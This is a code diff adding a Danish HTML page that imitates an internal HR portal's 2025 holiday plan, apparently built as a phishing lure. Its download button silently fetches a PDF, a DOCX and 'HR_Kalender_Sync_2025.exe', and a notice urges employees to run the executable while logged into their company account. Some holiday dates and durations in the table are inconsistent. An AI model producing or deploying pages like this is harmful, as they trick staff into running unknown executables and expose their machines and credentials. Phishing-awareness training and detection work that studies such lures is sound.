@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HR Intern – Ferieplan 2025</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f7f5; color: #1a2a1a; min-height: 100vh; }
+  header { background: #2d5a27; padding: 0 32px; height: 58px; display: flex; align-items: center; gap: 14px; }
+  .logo { display: flex; align-items: center; gap: 10px; }
+  .logo-box { width: 34px; height: 34px; background: rgba(255,255,255,0.18); border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; color: #fff; }
+  .logo-text { color: #fff; font-size: 15px; font-weight: 600; }
+  .logo-text span { display: block; font-size: 12px; font-weight: 400; color: #a0c898; }
+  .header-right { margin-left: auto; display: flex; align-items: center; gap: 20px; }
+  .header-right a { color: #a0c898; font-size: 13px; text-decoration: none; }
+  .header-right a:hover { color: #fff; }
+  .user-chip { display: flex; align-items: center; gap: 8px; background: rgba(255,255,255,0.1); border-radius: 20px; padding: 5px 12px 5px 6px; }
+  .user-avatar { width: 24px; height: 24px; background: #a0c898; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; color: #2d5a27; }
+  .user-chip span { color: #e0ede0; font-size: 13px; }
+  .container { max-width: 680px; margin: 36px auto; padding: 0 16px 60px; }
+  .page-header { margin-bottom: 24px; }
+  .page-header .breadcrumb { font-size: 12px; color: #6a8a6a; margin-bottom: 8px; }
+  .page-header h1 { font-size: 22px; font-weight: 600; color: #1a2a1a; }
+  .page-header p { font-size: 14px; color: #5a7a5a; margin-top: 4px; }
+  .card { background: #fff; border-radius: 10px; border: 1px solid #d8e8d8; overflow: hidden; }
+  .card + .card { margin-top: 16px; }
+  .card-head { background: #f2f8f2; border-bottom: 1px solid #d8e8d8; padding: 18px 24px; display: flex; align-items: center; gap: 14px; }
+  .card-head .icon { width: 40px; height: 40px; background: #d0eac8; border-radius: 8px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .card-head h2 { font-size: 15px; font-weight: 600; color: #1a2a1a; }
+  .card-head p { font-size: 13px; color: #5a7a5a; margin-top: 2px; }
+  .card-body { padding: 22px 24px; }
+  .year-selector { display: flex; gap: 8px; margin-bottom: 20px; }
+  .year-btn { padding: 7px 16px; border-radius: 20px; font-size: 13px; font-weight: 500; cursor: pointer; border: 1px solid #c8d8c8; background: #fff; color: #5a7a5a; transition: all 0.12s; }
+  .year-btn.active { background: #2d5a27; color: #fff; border-color: #2d5a27; }
+  .table-wrap { overflow-x: auto; margin-bottom: 22px; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th { background: #f2f8f2; text-align: left; padding: 10px 14px; color: #5a7a5a; font-weight: 500; font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; border-bottom: 1px solid #d8e8d8; }
+  td { padding: 11px 14px; border-bottom: 1px solid #edf5ed; color: #1a2a1a; }
+  tr:last-child td { border-bottom: none; }
+  .tag { display: inline-block; font-size: 11px; font-weight: 500; padding: 2px 9px; border-radius: 12px; }
+  .tag-ferie { background: #e8f5e8; color: #2d5a27; }
+  .tag-lukket { background: #fff3e0; color: #8a4a00; }
+  .tag-flex { background: #eef2ff; color: #3050b0; }
+  .divider { border: none; border-top: 1px solid #e8f0e8; margin: 18px 0; }
+  .file-list { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+  .file-item { display: flex; align-items: center; gap: 12px; padding: 12px 16px; background: #f7faf7; border: 1px solid #d8e8d8; border-radius: 7px; }
+  .file-icon { width: 36px; height: 36px; border-radius: 5px; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; flex-shrink: 0; }
+  .file-icon.pdf { background: #ffe8e8; color: #c0392b; }
+  .file-icon.docx { background: #e8eeff; color: #2c5fcc; }
+  .file-icon.exe { background: #e8f5e8; color: #2d6a1a; }
+  .file-info .name { font-size: 13px; font-weight: 500; color: #1a2a1a; }
+  .file-info .meta { font-size: 12px; color: #6a8a6a; }
+  .btn-download { display: block; width: 100%; background: #2d5a27; color: #fff; border: none; border-radius: 7px; padding: 13px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.15s; text-align: center; }
+  .btn-download:hover { background: #234a1e; }
+  .btn-download svg { width: 17px; height: 17px; vertical-align: -3px; margin-right: 7px; }
+  .info-box { background: #f0f8f0; border: 1px solid #b8d8b8; border-radius: 7px; padding: 14px 16px; margin-top: 14px; font-size: 13px; color: #2a5a2a; line-height: 1.6; }
+  .info-box strong { font-weight: 600; }
+  .contact-card { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+  .contact-item { background: #f7faf7; border: 1px solid #d8e8d8; border-radius: 7px; padding: 14px 16px; }
+  .contact-item label { display: block; font-size: 11px; text-transform: uppercase; letter-spacing: 0.06em; color: #6a8a6a; font-weight: 500; margin-bottom: 6px; }
+  .contact-item .name { font-size: 14px; font-weight: 500; color: #1a2a1a; }
+  .contact-item .role { font-size: 12px; color: #5a7a5a; }
+  .contact-item .email { font-size: 12px; color: #2d5a27; margin-top: 4px; }
+  footer { text-align: center; margin-top: 28px; font-size: 12px; color: #6a8a6a; line-height: 1.8; }
+  footer a { color: #2d5a27; text-decoration: none; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <div class="logo-box">HR</div>
+    <div class="logo-text">HR Intern <span>Medarbejderportal</span></div>
+  </div>
+  <div class="header-right">
+    <a href="#">Oversigt</a>
+    <a href="#">Lønsedler</a>
+    <a href="#">Ferie</a>
+    <div class="user-chip">
+      <div class="user-avatar">MJ</div>
+      <span>Mads Jensen</span>
+    </div>
+  </div>
+</header>
+
+<div class="container">
+  <div class="page-header">
+    <p class="breadcrumb">HR Intern › Ferie & Fridage › Ferieplan 2025</p>
+    <h1>Ferieplan 2025</h1>
+    <p>Godkendt af HR-afdelingen · Opdateret 16. juni 2025</p>
+  </div>
+
+  <div class="card">
+    <div class="card-head">
+      <div class="icon">
+        <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="#2d5a27" stroke-width="1.8"><path stroke-linecap="round" stroke-linejoin="round" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
+      </div>
+      <div>
+        <h2>Ferieoversigt og lukkedage</h2>
+        <p>Planlagte ferieperioder, helligdage og ekstraordinære lukkedage</p>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="year-selector">
+        <button class="year-btn active">2025</button>
+        <button class="year-btn">2026</button>
+      </div>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Periode</th><th>Beskrivelse</th><th>Type</th><th>Dage</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>14. – 18. apr.</td><td>Påskeferie</td><td><span class="tag tag-lukket">Lukket</span></td><td>5</td></tr>
+            <tr><td>19. – 20. maj</td><td>Kr. Himmelfart + bro</td><td><span class="tag tag-lukket">Lukket</span></td><td>2</td></tr>
+            <tr><td>5. juni</td><td>Grundlovsdag</td><td><span class="tag tag-lukket">Lukket</span></td><td>1</td></tr>
+            <tr><td>30. jun. – 1. aug.</td><td>Sommerferie (3 uger)</td><td><span class="tag tag-ferie">Ferie</span></td><td>15</td></tr>
+            <tr><td>22. – 26. dec.</td><td>Juleferie</td><td><span class="tag tag-ferie">Ferie</span></td><td>5</td></tr>
+            <tr><td>29. – 31. dec.</td><td>Nytårslukket</td><td><span class="tag tag-lukket">Lukket</span></td><td>3</td></tr>
+            <tr><td>Løbende</td><td>Fleksible fridage (aftales med leder)</td><td><span class="tag tag-flex">Flex</span></td><td>5</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-head">
+      <div class="icon">
+        <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="#2d5a27" stroke-width="1.8"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
+      </div>
+      <div>
+        <h2>Download ferieplanen</h2>
+        <p>Officielle dokumenter fra HR – hent og gem til din kalender</p>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="file-list">
+        <div class="file-item">
+          <div class="file-icon pdf">PDF</div>
+          <div class="file-info">
+            <div class="name">Ferieplan_2025_Godkendt.pdf</div>
+            <div class="meta">Officiel ferieplan · PDF · Godkendt 16. juni 2025</div>
+          </div>
+        </div>
+        <div class="file-item">
+          <div class="file-icon docx">DOCX</div>
+          <div class="file-info">
+            <div class="name">Ferieplan_2025_Redigerbar.docx</div>
+            <div class="meta">Redigerbar version til teampbrug · Word</div>
+          </div>
+        </div>
+        <div class="file-item">
+          <div class="file-icon exe">EXE</div>
+          <div class="file-info">
+            <div class="name">HR_Kalender_Sync_2025.exe</div>
+            <div class="meta">Synkroniser ferieplan til Outlook · Windows</div>
+          </div>
+        </div>
+      </div>
+
+      <button class="btn-download" onclick="downloadAll()">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
+        Download ferieplan her
+      </button>
+
+      <div class="info-box">
+        <strong>Bemærk:</strong> Kør <strong>HR_Kalender_Sync_2025.exe</strong> for automatisk at importere alle feriedatoer til din Outlook-kalender. Programmet kræver, at du er logget ind med din virksomhedsbrugerkonto. Kontakt HR ved spørgsmål: <strong>hr@virksomhed.dk</strong> · int. 1100.
+      </div>
+
+      <hr class="divider">
+
+      <p style="font-size: 12px; text-transform: uppercase; letter-spacing: 0.06em; color: #6a8a6a; font-weight: 500; margin-bottom: 14px;">HR-kontakter</p>
+      <div class="contact-card">
+        <div class="contact-item">
+          <label>HR-ansvarlig</label>
+          <div class="name">Anne Christensen</div>
+          <div class="role">HR Business Partner</div>
+          <div class="email">a.christensen@virksomhed.dk</div>
+        </div>
+        <div class="contact-item">
+          <label>HR-assistent</label>
+          <div class="name">Peter Madsen</div>
+          <div class="role">HR Coordinator</div>
+          <div class="email">p.madsen@virksomhed.dk</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    HR Intern · Fortroligt – kun til intern brug · Medarbejderportal<br>
+    <a href="#">Personalehåndbog</a> · <a href="#">Løn & Benefits</a> · <a href="#">Kontakt HR</a>
+  </footer>
+</div>
+
+<script>
+function downloadAll() {
+  const files = [
+    'Ferieplan_2025_Godkendt.pdf',
+    'Ferieplan_2025_Redigerbar.docx',
+    'HR_Kalender_Sync_2025.exe'
+  ];
+  files.forEach((filename, i) => {
+    setTimeout(() => {
+      const a = document.createElement('a');
+      a.href = filename;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }, i * 300);
+  });
+}
+</script>
+</body>
+</html>
